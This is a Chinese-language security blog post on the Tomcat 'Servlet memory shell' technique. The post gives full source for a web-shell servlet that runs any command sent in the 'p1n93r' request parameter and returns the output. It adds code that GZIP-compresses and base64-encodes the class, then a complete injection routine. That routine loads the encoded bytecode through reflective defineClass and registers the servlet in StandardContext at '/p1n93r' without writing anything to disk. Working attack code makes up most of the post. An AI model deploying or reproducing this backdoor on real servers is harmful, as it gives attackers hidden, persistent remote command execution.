---
typora-root-url: ../../../static
title: "Tomcat之Servlet内存马"
date: 2021-06-02T09:07:36+08:00
draft: false
categories: ["security"]
---

## 前置知识
- [Tomcat架构原理][l1]
- [Tomcat之Filter内存马][l2]

## 过程分析
前面文章中（Tomcat之Filter内存马），分析得到，我们可以通过StandardContext动态添加一个Filter，那么我们是否可以同样通过StandardContext动态添加Servlet呢？

答案是肯定的。首先我们看到StandardContext.children属性，发现这个属性就是存储Wrapper的：

![StandardContext.children][p1]

然后看到StandardContext.servletMappings，是存储Servlet的访问路径的，如下所示：

![StandardContext.servletMappings][p2]

我们只需要将包含恶意Servlet的StandardWrapper添加到StandardContext.children中即可；幸运的是，StandardContext提供了开放的addChildren()方法可以添加Wrapper，同时最后不要忘记在StandardContext中添加Servlet的映射关系，StandardContext同时也提供了开放的addServletMappingDecoded()来添加Servlet的映射关系。这种方式比Filter内存马稍微简单一点，因为提供了开放的方法可以直接调用；当然，弊端也很明显，可能Servlet内存马会被登录过滤器拦截啥的，所以植入的Servlet内存马的访问路径得实地分析下。

首先Servlet马的代码如下：

	public class CharEncodeServlet extends HttpServlet {
	    @Override
	    public void init(javax.servlet.ServletConfig servletConfig) {
	
	    }
	    @Override
	    public javax.servlet.ServletConfig getServletConfig() {
	        return null;
	    }
	    @Override
	    public void service(javax.servlet.ServletRequest servletRequest, javax.servlet.ServletResponse servletResponse) throws java.io.IOException {
	        String cmd = servletRequest.getParameter("p1n93r");
	        boolean isLinux = true;
	        String osTyp = System.getProperty("os.name");
	        if (osTyp != null && osTyp.toLowerCase().contains("win")) {
	            isLinux = false;
	        }
	        String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
	        java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
	        java.util.Scanner s = new java.util.Scanner(in).useDelimiter("\\a");
	        String output = s.hasNext() ? s.next() : "";
	        java.io.PrintWriter out = servletResponse.getWriter();
	        out.println(output);
	        out.flush();
	        out.close();
	    }
	    @Override
	    public String getServletInfo() {
	        return null;
	    }
	    @Override
	    public void destroy() {
	    }
	}

然后将Servlet马的字节码压缩后base64存储：

    public static void main(String[] args) throws IOException {
        InputStream in = Test.class.getClassLoader().getResourceAsStream("CharEncodeServlet.class");
        byte[] bytes = new byte[in.available()];
        in.read(bytes);
        // 将字节压缩下
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        GZIPOutputStream gzipOutputStream=new GZIPOutputStream(byteArrayOutputStream);
        gzipOutputStream.write(bytes);
        gzipOutputStream.close();
        System.out.println(java.util.Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()));
    }

最后给出完整的植入Servlet内存马的代码和过程：

	java.lang.ClassLoader classLoader = (java.lang.ClassLoader) Thread.currentThread().getContextClassLoader();
	java.lang.reflect.Method defineClass = java.lang.ClassLoader.class.getDeclaredMethod("defineClass",new Class[] {byte[].class, int.class, int.class});
	defineClass.setAccessible(true);
	// 这是经过GZIP压缩后的恶意Servlet的字节码
	String evalBase64 = "H4sIAAAAAAAAAIVWW1cTVxT+Tkgyk8mAkAASENHaSpBLaq1Ug7VaxEINiIRiQXsZhgMZTWbizIRLb/Zuay8+tausvtQnX9uXqO1qH/vQH8XqPpMYEwiYtbJnzr7v/e19kv+2/vwHwMu4p6AbKRmTYUzhsoxpBVcwoyCEtIxZ8XxLwpyMqzLeljEvY0HBNVwX5B0F7+I9Ce8raIEmY1E8dUGWBOEylsNYQUaBgRuC3BQkKyEnwWQInjFMwz3L0BDvm2Pwj1pLnGFfyjD5VCG3yO1ZbTFLnEjK0rXsnGYb4lxm+t2M4TBEU6MZzR4zdbJNc3s1y90REgrHDIfiqRvaqraecEqSRFlj1DKXjZUREbTRqWYxdO9pwdA8yd2MtTSt2VqOu9ymFJpXuJuu9dIT73uGH0kIDJ0KObdLkjP8VoE77shuUidvmQ73imhyakwYDu7tkprs1LqhlJ8Rh1DSc0sCDKGXyGrmSiLt2obpVWM4hFphnYEtMAQsZ3YjTyiQgYDoWj0Tn0ET0FaSGFZiwswXXBJyLUdC5iHryQqukU2kdc00uU2SoFVwSZOysQR96mCa/LpXbcP11BrTrqbfnNTy3rTQ/Eo4JcGiUWVQxtZ1nncNKksCpdn0FL8Jc9liaC2jt73IJeqdbW2Qh7RVsHV+0RCD2L5jAIeEsYqD6KF888fN0ydsCbdU2KCyJMsZMml2JLgqCnBUrGKcylkzTBVroBY2b49NzXIyRAZ1MqeeDvF1iutL6BI2VHyAD1V8hI8lfKLiNj5laNnROJHMZ2RyndL6HF+o+BJfqfhaBIaEOyq+wbcS7qr4Dt+r+AE9Kn4U2bfsqI1mq3ZOMq6bT4wTqShE62Bazb1c6T/Dgb3mlEElaCqrxnA0vhOXulBVt3DDcTnFDwtXtpXntksIhl0rZa1xe1QTsy/rlulqhknwdFWHENWnRS6mTou28KSznmymYLpGjowVclw5tNWMTpktLiSCjNCLx+vsQrUFZahzxxmpCVVmlia1pqn7n4TbsUEd8boCcVuoBYdf4FkjZ3hN7d29qdt2T8pozhRfd70Lm7rhN71D954XB0OIsi4tZm3CtRsbrcOmkHlxyoqrol6aVE1gOVsQ2xHQs5bDcRgH6OdMfIJgYgWJHqJTgp407Agcewj2B734SLWkJFbgOaJqSQFH8Dw9GV7AUdISxic9few0DHuG7SVh2VC89SJOtE+4EwfBOob+cioD5VR87Pdt7pqq8vBV8hjAIBqEJbsLP4UE7vdHfI/R4MOUf9gf8T9CIBmIBf5FNBYoIhiRipA3EWwY9rf5N9ER/Buh+YaIkp73R8Lp+cBg+gHaykxVMBs9ZjL4CE2xYBH7imhOSn+hZT4mPUQkEi2iNSnH5CLaNhEWz/YHCET2J0MDj9HBkFRiSixURCymFNEpSJfoU4NXWJKKAiL0LyJKhbUSbaPGtlN/OjCHGHR0wkEX7hBu9wi5nwmzXwm136hg0Yx8qeBKb+9jyMNSvL2I49SmEH7BSzhB8VT8RP9nTlKTonR9DRMvQDEu4RWcogbrOIvTlI9E8YYwgjOQKWonXiW9EMWOkPw1KDhHvg8jsIW4hPOMvrErEl7fwhBRCaMSLpwnJsZIzU+JXPRgDvnIJygjAdgbGH8m1EfqQj1Rmdd+71xn5HqrDFnF8E1P69L/8zMrkdUJAAA=";
	byte[] evalBytes = java.util.Base64.getDecoder().decode(evalBase64);
	java.io.ByteArrayInputStream byteInputStream = new java.io.ByteArrayInputStream(evalBytes);
	java.io.ByteArrayOutputStream byteOutputStream = new java.io.ByteArrayOutputStream();
	java.util.zip.GZIPInputStream gzipInputStream = new java.util.zip.GZIPInputStream(byteInputStream);
	byte[] buffer = new byte[1024];
	for (int i=-1;(i=gzipInputStream.read(buffer)) >0;){
		byteOutputStream.write(buffer,0,i);
	}
	byte[] bytes = byteOutputStream.toByteArray();
	// 先加载Servlet内存马类定义
	defineClass.invoke(classLoader, new Object[] {bytes, 0, bytes.length});
	String servletName="charEncodeServlet";
	// 先获取StandardContext
	org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
	org.apache.catalina.webresources.StandardRoot standardroot = (org.apache.catalina.webresources.StandardRoot) webappClassLoaderBase.getResources();
	org.apache.catalina.core.StandardContext standardContext = (org.apache.catalina.core.StandardContext)standardroot.getContext();
	// 利用StandardContext创建StandardWrapper
	org.apache.catalina.Wrapper wrapper = standardContext.createWrapper();
	javax.servlet.http.HttpServlet evalServlet = (javax.servlet.http.HttpServlet) Class.forName("CharEncodeServlet").newInstance();
	// wrapper容器中放入servlet马
	wrapper.setServlet(evalServlet);
	wrapper.setName(servletName);
	// 往StandardContext中添加wrapper
	standardContext.addChild(wrapper);
	// 不要忘记在StandardContext中添加ServletMapping
	standardContext.addServletMappingDecoded("/p1n93r",servletName);

最后的植入效果如下所示：

![Servlet内存马][p3]

查看StandardContext.children，如下所示：

![StandardContext.children][p4]

查看StandardContext.servletMappings，如下所示：

![StandardContext.servletMappings][p5]





[l1]:https://p1n93r.github.io/post/java/tomcat%E6%9E%B6%E6%9E%84%E5%8E%9F%E7%90%86/
[l2]:https://p1n93r.github.io/post/security/tomcat%E4%B9%8Bfilter%E5%86%85%E5%AD%98%E9%A9%AC/

[p1]:/media/2021-06-02-01.png
[p2]:/media/2021-06-02-02.png
[p3]:/media/2021-06-02-03.png
[p4]:/media/2021-06-02-04.png
[p5]:/media/2021-06-02-05.png